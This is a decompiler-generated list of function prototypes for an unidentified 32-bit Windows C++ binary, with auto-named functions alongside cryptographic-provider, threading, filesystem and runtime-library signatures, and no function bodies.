bool __thiscall sub_452310(_DWORD *this, int a2, int a3);
bool __cdecl sub_452370(_DWORD *a1, _DWORD *a2);
_DWORD *__cdecl sub_452400(_DWORD *a1, int a2, _DWORD *a3, char a4);
int __cdecl sub_4524F0(_DWORD *a1, unsigned int *a2);
_DWORD *__thiscall sub_452530(_DWORD *this, int a2, int a3, char a4, int a5, _DWORD *a6, int a7);
char *__thiscall sub_4526B0(char *this, int a2);
char *__thiscall sub_452740(char *this, size_t *a2);
_DWORD *__thiscall sub_452860(_DWORD *this, int a2);
_DWORD *__thiscall sub_452890(_DWORD *this, int a2);
_DWORD *__thiscall sub_452930(_DWORD *this, int a2, int a3, char a4, int a5, _DWORD *a6, _DWORD *a7);
char *__thiscall sub_452A40(char *this, int a2);
char *__thiscall sub_452AD0(char *this, size_t *a2, size_t *a3);
_DWORD *__thiscall sub_452D00(_DWORD *this, int a2, int a3, int a4, int a5);
int __thiscall sub_452E80(int this, int a2, int a3, int a4, char a5);
void __thiscall sub_453000(char *this);
char *__thiscall sub_4530B3(_DWORD *this, char a2);
_DWORD *__thiscall sub_453130(_DWORD *this, char a2);
int __thiscall sub_453180(_DWORD **this, int a2);
char __thiscall sub_4531A0(unsigned int *this, void *a2, int a3, unsigned int *a4);
int __thiscall sub_453200(_DWORD *this);
int __thiscall sub_453230(_DWORD *this, size_t *a2, _DWORD *a3);
int __thiscall sub_4532E0(_DWORD **this);
char __thiscall sub_453300(int this, int a2, int a3, int a4, int a5);
char __thiscall sub_453330(int this, int a2, int a3, int a4);
int __thiscall sub_453360(int *this, size_t *a2, char *a3, int a4, int a5, int a6);
int __thiscall sub_453420(int this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_453460(int this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_4534A0(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_4534D0(_DWORD *this, int a2, _QWORD *a3, __int64 a4, int a5, int a6);
int __thiscall sub_453540(_DWORD *this, _DWORD *a2);
int __thiscall sub_453590(_DWORD **this);
int __thiscall sub_4535B0(_DWORD *this, int a2);
int __thiscall sub_4535D0(int *this, int a2);
char __thiscall sub_453620(_DWORD *this, int a2, int a3, int a4);
char __thiscall sub_4536A0(int this, int a2, int a3, int a4);
void __thiscall sub_4536C0(unsigned int *this);
int __thiscall sub_453790(_DWORD *this);
int __thiscall sub_4537D0(_DWORD *this, unsigned int *a2);
char __thiscall sub_453830(_BYTE *this);
int __thiscall sub_453850(_DWORD *this, int a2, int a3, size_t a4);
int __thiscall sub_453890(_DWORD *this, int a2, int a3, unsigned int a4, size_t a5);
int __thiscall sub_4538D0(_DWORD *this, int a2, int a3, size_t a4, size_t a5, size_t *a6);
int __thiscall sub_453920(_DWORD *this, int a2, int a3);
void __thiscall sub_453970(int this, int a2, int a3);
int __thiscall sub_453990(int this, int a2, _DWORD *a3, _DWORD *a4, int *a5);
char __thiscall sub_453B80(unsigned int *this, char a2, char a3);
char __thiscall sub_453C20(_DWORD *this, int a2, int a3);
int __thiscall sub_453C40(_DWORD *this, int *a2);
int __thiscall sub_453CF0(int *this, int a2);
int __thiscall sub_453D10(int *this, int a2);
int __thiscall sub_453DD0(int this, int a2);
int __fastcall sub_453E30(_DWORD *a1, int a2, char *a3, size_t a4);
int __fastcall sub_453E60(_DWORD *a1, int a2, char *a3, size_t Size);
bool __thiscall sub_454340(_DWORD *this, int a2, int a3);
char __thiscall sub_4543D0(int this, int a2, int a3);
int __thiscall sub_4543F0(int this, int a2);
_DWORD *sub_454490();
int __thiscall sub_454500(int *this, int a2, int a3, char a4);
int __thiscall sub_454530(_DWORD *this, int a2, int a3);
int __thiscall sub_454550(_DWORD **this, int a2, int a3);
int __thiscall sub_454590(_DWORD *this, int a2, int a3);
int __thiscall sub_4545C0(_DWORD *this, int a2, int a3);
// int __userpurge sub_4545E0@<eax>(int *a1@<ecx>, int a2@<ebp>, int a3@<esi>, int a4, unsigned int a5);
int __thiscall sub_454730(_DWORD *this, int a2, int a3, int a4, int a5, int a6, int a7);
size_t __thiscall sub_454780(_DWORD *this, void *Src, size_t a3, int a4, int a5);
unsigned int __thiscall sub_4547E0(_DWORD *this, unsigned int a2, unsigned int a3, int a4, int a5);
int __thiscall sub_454840(_DWORD *this, int a2, int a3, int a4, int a5);
int __thiscall sub_454960(int this, int a2, int a3, int a4, int a5);
void __thiscall sub_454990(int this, char *Src, size_t a3);
int __thiscall sub_454A10(int *this, char *a2, int a3, int a4, int a5, char a6);
int __thiscall sub_454E20(int this, int a2, int a3, int a4, int a5);
int __thiscall sub_454E50(_DWORD *this, int a2, int a3);
void __thiscall sub_454EC0(_DWORD *this, int a2);
int __thiscall sub_454FD0(void *this);
int __thiscall sub_454FF0(_DWORD *this, int a2, _DWORD *a3, int a4, int a5);
_DWORD *__thiscall sub_455040(_DWORD *this, int a2);
_DWORD *__thiscall sub_4550C0(_DWORD *this);
_DWORD *__thiscall sub_4550E0(_DWORD *this, char a2);
char __thiscall sub_455150(_DWORD *this, char *a2, int a3, char *a4);
char __thiscall sub_455160(const char **this, char *a2, int a3, char *a4);
char __thiscall sub_455290(int this, const char *a2, int a3, int a4);
char *__thiscall sub_455320(char *this, int a2);
char *__thiscall sub_4553B0(char *this, _DWORD *a2);
char *__thiscall sub_455420(char *this, int a2);
char *__thiscall sub_4554B0(char *this, int a2);
char *__thiscall sub_455540(char *this, size_t *a2);
char *__thiscall sub_455660(char *this, int a2);
char *__thiscall sub_4556F0(char *this, size_t *a2);
char *__thiscall sub_455810(char *this, int a2);
char *__thiscall sub_4558A0(char *this);
char *__thiscall sub_455970(char *this, int a2);
char *__thiscall sub_455A00(char *this);
int __thiscall sub_455AD0(int *this, int a2, _DWORD *a3, __int64 a4, int a5, int a6);
char __thiscall sub_455D30(_DWORD *this, int a2, int a3);
int __thiscall sub_455DE0(_DWORD *this, int a2);
__int64 __thiscall sub_456140(_DWORD *this);
int __thiscall sub_4561C0(int **this, int a2, unsigned int a3, int a4, int a5);
unsigned __int64 __thiscall sub_4562D0(_DWORD *this, __int64 a2);
_DWORD *__thiscall sub_4563D0(int this, int a2);
int __thiscall sub_456750(int this, int a2, _DWORD *a3, int a4, int a5);
int __thiscall sub_456900(int *this);
_BYTE *__thiscall sub_456A70(_BYTE *this, __int128 a2, __int64 a3);
_BYTE *__thiscall sub_456C10(_BYTE *this, int a2, int a3, int a4);
int __thiscall sub_456DB0(_BYTE *this, int a2);
int __thiscall sub_456E90(_DWORD *this, int a2, void *a3, size_t a4);
int __thiscall sub_456EE0(_DWORD *this);
int __thiscall sub_456F10(_DWORD *this, int a2, int a3, int a4, unsigned int a5);
void __thiscall sub_456FC0(_DWORD *this);
int __thiscall sub_457020(_DWORD *this, unsigned int a2, unsigned int a3);
HCRYPTPROV *__thiscall sub_457070(HCRYPTPROV *phProv);
char *__thiscall sub_457140(char *this, int a2);
char *__thiscall sub_4571D0(char *this, size_t *a2);
_DWORD *__thiscall sub_457560(_DWORD *this, char a2);
BOOL __stdcall sub_4575A0(BYTE *pbBuffer, DWORD dwLen);
int sub_457630();
void __thiscall sub_457740(void *this, int a2, DWORD dwLen);
unsigned int **__thiscall sub_457850(unsigned int **this, unsigned __int32 *a2);
_DWORD *__thiscall sub_4578B1(_DWORD *this, unsigned int a2);
unsigned int __cdecl sub_457947(int a1, int a2, unsigned int a3);
unsigned int __cdecl sub_457986(int a1, char *a2, int a3, void *a4, size_t a5);
// unsigned int __userpurge sub_457A18@<eax>(int *a1@<ecx>, __m64 a2@<mm2>, __m64 a3@<mm3>, __m128i *a4, __m128i *a5, __m128i *a6, unsigned int a7, char a8);
int __stdcall sub_457CB3(int a1);
bool __cdecl sub_457D2A(unsigned int a1, unsigned int a2);
unsigned __int32 __cdecl sub_457DE0(unsigned int a1);
void sub_457DE7();
int sub_457FF8();
int sub_4580D0();
char sub_4580F0();
char sub_458110();
char sub_458130();
bool __cdecl sub_458150(int a1);
int sub_458159();
// _DWORD *__userpurge sub_45817B@<eax>(int *a1@<ecx>, __m64 a2@<mm2>, __m64 a3@<mm3>, __m128i *a4, __m128i *a5, __m128i *a6);
// unsigned int *__usercall sub_458AC4@<eax>(const __m128i *a1@<edx>, int a2@<ecx>, __m64 a3@<mm2>, __m64 a4@<mm3>);
int __thiscall sub_45912B(_DWORD *this, char *a2, size_t a3, int a4);
void *__cdecl j__memset(void *, int Val, size_t Size);
char *__thiscall sub_459E90(char *this, int a2);
char *__thiscall sub_459F20(char *this, size_t *a2, void *a3, void *a4);
char *__thiscall sub_45A1F0(char *this, size_t *a2, void *a3);
void __thiscall sub_45A380(_DWORD *this, char *Src, size_t Size);
void __thiscall sub_45A450(int *this, char *a2, char *a3, size_t a4);
int __thiscall sub_45A680(int *this, int a2, unsigned int a3);
int __thiscall sub_45A760(_DWORD *this, int a2, int a3, int *a4);
int __thiscall sub_45A7B0(_DWORD *this, int a2, int a3);
void __thiscall sub_45AA80(char *this, char *a2, size_t a3);
char *__thiscall sub_45AB70(char *this, int a2);
char *__thiscall sub_45ABA0(char *this);
_DWORD *__thiscall sub_45ABE0(_DWORD *this, char a2);
int __cdecl sub_45AC10(int a1);
_DWORD __cdecl j_j_unknown_libname_61(_DWORD); // weak
int __cdecl sub_45AC80(int a1, wchar_t *Src, char a3);
void *__cdecl sub_45AEA0(size_t Size);
void __cdecl j_j___free_base(void *Block);
bool __cdecl sub_45AF10(int a1, __m128i *a2, unsigned int a3);
char __cdecl sub_45B110(unsigned int a1, unsigned int a2, unsigned int a3, unsigned int a4);
void __cdecl sub_45B3B0(unsigned int a1, unsigned int a2, unsigned int a3);
int __thiscall sub_45B570(void *this, void *a2, const char *a3, int a4);
void __thiscall sub_45B640(_DWORD *this, void *a2);
void __thiscall sub_45B7C0(_DWORD *this, void *a2);
void __thiscall sub_45B970(_DWORD *this, int *a2);
int __thiscall sub_45BB80(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
int __thiscall sub_45BD00(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
int __thiscall sub_45BEF0(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
int __stdcall sub_45C050(int a1);
int __stdcall sub_45C0D0(int a1);
int __thiscall sub_45C0F0(__m128i **this, __m128i *a2, unsigned int a3);
int __thiscall sub_45C1A0(__m128i **this, __m128i *a2, unsigned int a3);
_DWORD *__cdecl sub_45C280(_DWORD *a1);
_OWORD *__cdecl sub_45C2B0(_OWORD *a1);
int __cdecl sub_45C2D0(int *a1, int *a2);
int __cdecl sub_45D360(int a1);
int __cdecl sub_45D3D0(__int128 *a1, unsigned int *a2);
int __fastcall sub_45E0F0(const __m128i *a1, unsigned int *a2, int a3);
__m128i *__cdecl sub_45F050(int *a1, int *a2);
__m128i *__cdecl sub_45F090(__int128 *a1, unsigned int *a2);
int __thiscall sub_45F0D0(int this, int a2);
_DWORD *__thiscall sub_45F1C0(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_45F220(_DWORD *this, int a2);
// void __thiscall boost::exception::~exception(boost::exception *__hidden this); weak
_DWORD *__thiscall sub_45F2D0(_DWORD *this, int a2);
_DWORD *__thiscall sub_45F2E9(_DWORD *this, char a2);
_DWORD *__thiscall sub_45F300(_DWORD *this, char a2);
void __thiscall sub_45F370(_DWORD *this);
_DWORD *__thiscall sub_45F420(_DWORD *this);
int __thiscall sub_45F4D0(_DWORD *this, int a2);
int __thiscall sub_45F610(void *this, int a2, int *a3, __int64 a4, int a5, int a6);
int __thiscall sub_45F6F0(_DWORD *this, int a2, int *a3, __int64 a4, int a5, int a6);
int __thiscall sub_45F7B0(int *this, size_t *a2);
__int64 __thiscall sub_45F890(_DWORD *this);
void __thiscall sub_45F8D0(_DWORD *this);
int __thiscall sub_45F960(int this, _BYTE *a2);
int __thiscall sub_45F9E0(int *this, int a2, int a3);
int __thiscall sub_45FA90(int *this, int a2);
bool __thiscall sub_45FB40(_DWORD *this);
_DWORD *__thiscall sub_45FB60(_DWORD *this, int a2);
int __thiscall sub_45FBA0(_DWORD *this, int a2);
int __thiscall sub_45FBD0(int this, _BYTE *a2);
int __thiscall sub_45FC10(int *this, int a2, int a3);
int __thiscall sub_45FCB0(int *this, int a2);
int __thiscall sub_45FD50(_DWORD *this, char *a2, unsigned int a3, int a4, int a5);
int __thiscall sub_45FEC0(int this, _DWORD *a2, unsigned int *a3, int a4, char a5);
int __thiscall sub_460010(_DWORD *this, int a2, unsigned int *a3, int a4, int a5);
int __thiscall sub_460150(_DWORD *this, __m128i *a2, unsigned int a3);
int __thiscall sub_4610C0(int this);
int __thiscall sub_461140(_DWORD *this, int a2, int a3);
int __thiscall sub_4611A0(int this);
int __thiscall sub_4611E0(_DWORD *this);
int __thiscall sub_461210(_DWORD *this);
int __thiscall sub_461250(_DWORD *this, __m128i *Src, size_t Size);
signed int __fastcall sub_4613A0(int a1, int a2, int a3, int a4, unsigned int a5);
int __cdecl sub_461AF0(int a1, void *a2, void *a3, unsigned int a4);
char *__thiscall sub_461B40(char *this, int a2);
char *__thiscall sub_461BD0(char *this, size_t *a2);
int __thiscall sub_461CF0(_DWORD *this, _DWORD *a2);
int __thiscall sub_461D30(int *this);
// int __userpurge sub_461D50@<eax>(int *a1@<ecx>, int a2@<esi>, void *a3, size_t Size);
char *__thiscall sub_461EB0(_DWORD *this, char *Src, size_t a3);
_DWORD *__thiscall sub_462070(_DWORD *this);
int __thiscall sub_4621A0(int this, char a2);
// void __userpurge sub_462220(int a1@<ecx>, int a2@<edi>, int a3, int a4, unsigned int a5, unsigned int a6);
// _BYTE *__userpurge sub_462310@<eax>(int a1@<ecx>, int a2@<ebp>, char *a3, size_t a4);
int __thiscall sub_4624A0(void *this, unsigned int a2);
int __thiscall sub_4624C0(void *this, int a2, const void *a3, size_t a4, _BYTE *a5, unsigned int a6, int *a7);
_BYTE *__thiscall sub_462670(_DWORD *this, _BYTE *a2, char *a3, unsigned int a4, void *a5, int *a6);
int sub_462940();
_DWORD *__thiscall sub_462950(_DWORD *this);
int __thiscall sub_462980(int this, char *a2, _DWORD *a3);
_DWORD *__thiscall sub_462A20(int *this, _DWORD *a2, int a3);
int __thiscall sub_462A90(int this, int a2, int a3, unsigned int a4);
void __thiscall __noreturn sub_462BF0(_DWORD); // weak
_DWORD *__thiscall sub_462C00(int *this, _DWORD *a2);
int __thiscall sub_462C50(int this, int a2, _DWORD *a3);
int __thiscall sub_462D20(const void **this, _BYTE *Src, _WORD *a3);
_DWORD *__thiscall sub_462E00(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, int a5);
void __thiscall sub_462F60(_DWORD *this);
_DWORD *__stdcall sub_463090(_DWORD *a1, unsigned int a2);
_DWORD *__thiscall sub_463140(_DWORD *this, int a2);
_DWORD *__thiscall sub_4631A0(_DWORD *this, char a2);
_DWORD *__cdecl sub_463210(_DWORD *a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
void __thiscall sub_463390(_DWORD *this);
char __cdecl sub_463740(_DWORD *a1);
char __cdecl sub_4637D0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned __int8 (__thiscall ***a5)(_DWORD, _DWORD *));
bool __cdecl sub_463D10(_DWORD *a1);
bool __cdecl sub_463F80(_DWORD *a1);
char __cdecl sub_4645F0(_DWORD *a1, int a2);
int __cdecl sub_464C40(_DWORD *a1, _DWORD *a2);
_DWORD *__cdecl sub_464E40(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4);
_DWORD *__cdecl sub_4650E0(_DWORD *a1, unsigned int a2);
_DWORD *__cdecl sub_465410(_DWORD *a1, _DWORD *a2, int a3, int a4, _DWORD *a5, _DWORD *a6, _DWORD *a7);
char __thiscall sub_465640(_DWORD *this, _DWORD *a2);
unsigned int __cdecl sub_4658D0(_DWORD *a1);
char __cdecl sub_4658E0(int *a1, _DWORD *a2, unsigned int a3);
int sub_465BB0();
int sub_465DB0();
void __cdecl sub_465F20(_DWORD *a1, unsigned __int16 a2, _DWORD *a3, _DWORD *a4, unsigned __int16 a5);
char __cdecl sub_4660A0(_DWORD *a1, unsigned int a2);
bool __cdecl sub_466110(int *a1, _DWORD *a2, int a3);
int __thiscall sub_466170(_DWORD *this, int a2, int a3, int a4);
char *__thiscall sub_4661D0(int this, unsigned int a2);
_DWORD *__stdcall sub_466250(unsigned int a1);
unsigned int *__thiscall sub_4662B0(int *this, unsigned int *a2, int a3, int a4, int a5, int a6);
void __thiscall sub_466460(int *this, unsigned int a2, char a3);
int sub_466590();
int __thiscall sub_466920(void *this, int a2, int a3, int a4, int a5, void *Src, size_t Size, int a8, _BYTE *a9, unsigned int a10);
_DWORD *__thiscall sub_4669A0(_DWORD *this, int a2);
_DWORD *__thiscall sub_466BFD(_DWORD *this, char a2);
_DWORD *__thiscall sub_466C10(_DWORD *this, char a2);
bool __thiscall sub_466C70(_DWORD *this);
// int __userpurge sub_466CB0@<eax>(_DWORD *a1@<ecx>, int a2@<edi>, int a3, unsigned __int64 *a4, int a5, unsigned int a6, unsigned int a7, int a8);
char __thiscall sub_466D20(_DWORD *this);
int __thiscall sub_466DC0(_DWORD *this, int a2);
char __thiscall sub_466FE0(_DWORD *this, int a2);
__int64 __thiscall sub_467070(_DWORD *this);
int __thiscall sub_4670A0(_DWORD *this);
int __thiscall sub_4670B0(_DWORD *this);
int __thiscall sub_4670C0(_DWORD *this);
int __thiscall sub_467110(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
int __thiscall sub_467250(_DWORD *this, int a2);
int __thiscall sub_467260(_DWORD *this);
int __thiscall sub_467270(_DWORD *this, int a2, int *a3, int a4, int a5);
void __thiscall sub_4672F0(_DWORD *this, void *a2);
void __thiscall sub_467490(_DWORD *this, void *a2);
void __thiscall sub_467630(_DWORD *this);
void __thiscall __noreturn sub_4676D0(_DWORD); // weak
unsigned int __cdecl sub_4676E0(void (__cdecl *a1)(__m128i *, int, int), void (__cdecl *a2)(__m128i *, __m128i *, __m128i *, __m128i *, int, int), int a3, int a4, __m128i *a5, __m128i *a6, __m128i *a7, unsigned int a8, char a9);
int sub_4679A0(); // weak
__m128i *__cdecl sub_467A80(__m128i *a1, __m128i *a2, int a3);
unsigned int __cdecl sub_467AF0(int a1, int a2, __m128i *a3, __m128i *a4, __m128i *a5, unsigned int a6, char a7);
unsigned int __cdecl sub_467B20(_OWORD *a1, int a2);
char *__cdecl sub_467B80(char *Src, size_t Size, char *a3);
__m128i *__cdecl sub_467D10(__m128i *a1, __m128i *a2, unsigned int a3, int a4);
__m128i *__cdecl sub_467FB0(__m128i *a1, __m128i *a2, unsigned int a3, int a4);
unsigned int __cdecl sub_468340(__m128i *a1, unsigned int a2, __m128i *a3, __m128i *a4);
__m128i *__cdecl sub_4685C0(__m128i *a1);
unsigned int __cdecl sub_4685E0(__m128i *a1, int a2, int a3);
__m128i *__cdecl sub_4687C0(__m128i *a1, __m128i *a2, __m128i *a3);
LARGE_INTEGER sub_4687E0();
__int64 sub_468890();
char sub_4689A0();
bool __cdecl sub_468A20(__int64 a1, __int64 a2);
__int64 __thiscall sub_468A40(void *this);
_QWORD *__cdecl sub_468A50(_QWORD *a1, int a2);
void __thiscall sub_468A70(void *this);
void *__thiscall sub_468B00(void *this, char a2);
int *sub_468B30();
int __thiscall sub_468D10(_DWORD *this, int a2);
int __thiscall sub_468D90(_DWORD **this);
// void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int); weak
// void __stdcall `vector constructor iterator'(void *, unsigned int, unsigned int, void *(__thiscall *)(void *)); weak
_DWORD *__cdecl sub_468EC3(_DWORD *a1);
void __thiscall sub_468F15(_DWORD *this);
// _DWORD __cdecl unknown_libname_7(_DWORD, _Mtx_t, _DWORD); weak
void __thiscall sub_468FE5(_DWORD *this);
int __thiscall sub_468FED(char *this);
void __thiscall sub_468FF8(_DWORD *this);
int __thiscall sub_469000(char *this);
// void __cdecl _Cnd_destroy(_Cnd_t);
// void __cdecl _Cnd_destroy_in_situ(_Cnd_t);
// int __cdecl _Cnd_init(_Cnd_t *);
_DWORD __cdecl sub_46913A(_DWORD); // weak
// int __cdecl _Cnd_signal(_Cnd_t);
int __cdecl sub_46915E(int a1, struct _Mtx_internal_imp_t *a2);
// int __cdecl _Mbrtowc(wchar_t *, const char *, size_t, mbstate_t *, const _Cvtvec *);
FARPROC __stdcall sub_4692FC(volatile __int32 *a1, LPCWSTR lpModuleName, LPCSTR lpProcName, int (__stdcall *a4)());
// _DWORD __cdecl unknown_libname_8(_DWORD); weak
// _DWORD __stdcall __std_fs_code_page(); weak
// __int64 __stdcall __std_fs_convert_narrow_to_wide(UINT CodePage, LPCCH lpMultiByteStr, _DWORD cbMultiByte, LPWSTR lpWideCharStr, _DWORD cchWideChar); weak
// __int64 __stdcall __std_fs_convert_wide_to_narrow(UINT CodePage, LPCWCH lpWideCharStr, _DWORD cchWideChar, LPSTR lpMultiByteStr, _DWORD cbMultiByte); weak
// __int64 __stdcall __std_fs_create_directory(LPCWSTR lpPathName); weak
// _DWORD __stdcall __std_fs_get_stats(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __std_fs_remove(LPCWSTR lpPathName); weak
// _DWORD __stdcall __std_fs_space(LPCWSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes); weak
// _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this); weak
// _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD); weak
// void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this); weak
int sub_469B2D();
void sub_469B39();
// _DWORD __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *); weak
// void __cdecl std::_Throw_C_error(_DWORD); weak
// void __cdecl __noreturn std::_Throw_Cpp_error(_DWORD); weak
int j____uncaught_exceptions(void); // weak
// void __thiscall std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t(std::_Fac_tidy_reg_t *__hidden this); weak
// void __cdecl std::_Facet_Register(struct std::_Facet_base *); weak
int sub_469E47();
// struct std::locale::_Locimp *__cdecl std::locale::_Init(bool); weak
// void __cdecl std::_Locinfo::_Locinfo_ctor(struct std::_Locinfo *, const char *Locale); weak
// void __cdecl std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *); weak
int j____uncaught_exception(void); // weak
char *__thiscall sub_46A070(char *this, int a2);
char *__thiscall sub_46A08B(char *this, int a2);
char *__thiscall sub_46A0AA(char *this, int a2);
char *__thiscall sub_46A0C5(char *this, int a2);
char *__thiscall sub_46A0E4(char *this, int a2);
char *__thiscall sub_46A0FF(char *this, int a2);
char *__thiscall sub_46A11A(char *this, int a2);
void __noreturn sub_46A166(void); // weak
void __cdecl __noreturn sub_46A183(int a1);
void __cdecl __noreturn sub_46A1A3(int a1);
// const char *__cdecl std::_Syserror_map(_DWORD); weak
// unsigned int __cdecl std::_Winerror_message(DWORD dwMessageId, LPSTR lpMultiByteStr, DWORD nSize); weak
// void __cdecl std::ios_base::_Addstd(struct std::ios_base *); weak
// void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *); weak
FILE *__cdecl sub_46A42C(char *a1, int a2, int a3);
FILE *__cdecl sub_46A4CC(wchar_t *a1, int a2, int a3);
FILE *__cdecl sub_46A56C(char *a1, int a2, int a3);
FILE *__cdecl sub_46A575(wchar_t *a1, int a2, int a3);
FILE *__cdecl sub_46A57E(char *FileName, int a2, int ShFlag);
FILE *__cdecl sub_46A59B(wchar_t *FileName, int a2, int ShFlag);
// unsigned int __cdecl std::_Random_device(); weak
// __int16 __cdecl _Getwctype(wchar_t, const _Ctypevec *);
// const wchar_t *__cdecl _Getwctypes(const wchar_t *, const wchar_t *, __int16 *, const _Ctypevec *);
_DWORD *__cdecl sub_46A650(int a1);
void sub_46A6A2();
void __thiscall sub_46A6AA(int this);
signed __int32 __thiscall sub_46A6B5(int this);
int __thiscall sub_46A6C8(char *this);
char __thiscall sub_46A85D(void *this);
void __thiscall sub_46A8B5(int this);
void __thiscall sub_46A8BD(int this);
int __thiscall sub_46A8C8(char *this);
// void __cdecl _Mtx_destroy(_Mtx_t);
// void __cdecl _Mtx_destroy_in_situ(_Mtx_t);
// int __cdecl _Mtx_init(_Mtx_t *, int);
// void __cdecl _Mtx_init_in_situ(_Mtx_t, int);
// int __cdecl _Mtx_lock(_Mtx_t);
// int __cdecl _Mtx_unlock(_Mtx_t);
// wchar_t __cdecl _Towlower(wchar_t, const _Ctypevec *);
// _Ctypevec *__cdecl _Getctype(_Ctypevec *__return_ptr __struct_ptr retstr);
// int __cdecl _Tolower(int, const _Ctypevec *);
// _Cvtvec *__cdecl _Getcvt(_Cvtvec *__return_ptr __struct_ptr retstr);
// int __cdecl _Wcrtomb(char *, wchar_t, mbstate_t *, const _Cvtvec *);
// void __cdecl _Cnd_do_broadcast_at_thread_exit();
// DWORD __stdcall GetCurrentThreadId();
// int __cdecl _Thrd_join(_Thrd_t, int *);
// int __cdecl _Thrd_start(_Thrd_imp_t *, _Thrd_callback_t, void *);
// int __cdecl _Toupper(int, const _Ctypevec *);
// wchar_t __cdecl _Towupper(wchar_t, const _Ctypevec *);
// _DWORD __cdecl _Stolx(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl _Stoulx(_DWORD, _DWORD, size_t MaxCount, _DWORD); weak
// __int64 __cdecl _Stollx(_DWORD, _DWORD, _DWORD, _DWORD); weak
// __int64 __cdecl _Stoullx(_DWORD, _DWORD, size_t MaxCount, _DWORD); weak
// void (__cdecl *__cdecl std::set_new_handler(void (__cdecl *)()))(); weak
// _DWORD __cdecl unknown_libname_13(_DWORD); weak
// _DWORD __cdecl unknown_libname_14(_DWORD); weak
// _DWORD __cdecl unknown_libname_15(_DWORD); weak
// _DWORD __cdecl __crtCreateEventExW(LPSECURITY_ATTRIBUTES lpEventAttributes, LPCWSTR lpName, _DWORD, _DWORD); weak
// _DWORD __cdecl __crtCreateSemaphoreExW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_16(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_17(_DWORD, _DWORD, _DWORD); weak
// int __cdecl __crtFlushProcessWriteBuffers(_DWORD); weak
// _DWORD __cdecl unknown_libname_18(_DWORD, _DWORD); weak
// int __crtGetCurrentProcessorNumber(void); weak
// _DWORD __cdecl unknown_libname_19(_DWORD); weak
// _DWORD __cdecl __crtInitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, _DWORD); weak
// _DWORD __cdecl unknown_libname_20(_DWORD); weak
// _DWORD __cdecl unknown_libname_21(_DWORD); weak
// _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_24(_DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_25(_DWORD); weak
// _DWORD __cdecl unknown_libname_26(_DWORD); weak
// _DWORD __cdecl _Mtxdst(LPCRITICAL_SECTION lpCriticalSection); weak
// _DWORD __cdecl unknown_libname_27(LPCRITICAL_SECTION lpCriticalSection); weak
void __cdecl sub_46BE19(LPCRITICAL_SECTION lpCriticalSection);
// void __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *__hidden this); weak
// _DWORD __cdecl _freea_crt(_DWORD); weak
// void __fastcall __security_check_cookie(uintptr_t StackCookie);
void __cdecl j_j_j___free_base(void *Block);
// _DWORD __cdecl _Init_thread_footer(_DWORD); weak
// _DWORD __cdecl _Init_thread_header(_DWORD); weak
void sub_46C4C6();
// void *__cdecl operator new(size_t Size); weak
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *)); weak
// int __cdecl atexit(void (__cdecl *)());
void __cdecl sub_46C87D(void *Block);
_DWORD *__thiscall sub_46C88B(_DWORD *this, char a2);
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *)); weak
int sub_46C9CD();
int sub_46C9D5();
// int __cdecl unknown_libname_28(_DWORD); weak
void __cdecl sub_46D40D(void *Block);
LPTOP_LEVEL_EXCEPTION_FILTER sub_46D879();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_46D8C6();
char *__thiscall sub_46D8CE(char *this, int a2);
_DWORD *__thiscall sub_46D8E9(_DWORD *this);
void __noreturn sub_46D901(); // weak
int sub_46D97B();
void *sub_46DA4A();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_46DA6D();
void *sub_46DA79();
void *sub_46DA7F();
void sub_46DA85();
void __cdecl sub_46DAB1(); // idb
int __thiscall sub_46DB0D(int this, int a2, char a3, unsigned __int8 a4);
_DWORD *__thiscall sub_46DB49(_DWORD *this, char a2, int a3, char a4, unsigned __int8 a5);
int __thiscall sub_46DBD0(int this, char a2);
_DWORD *__thiscall sub_46DBFF(_DWORD *this, int a2, char a3, unsigned __int8 a4);
_DWORD *__thiscall sub_46DC27(_DWORD *this);
_DWORD *__thiscall sub_46DC47(_DWORD *this);
_DWORD *__thiscall sub_46DC64(_DWORD *this);
unsigned int __thiscall sub_46DC95(_DWORD *this);
void __thiscall sub_46DCB3(_DWORD *this);
void __thiscall sub_46DCFF(_DWORD *this);
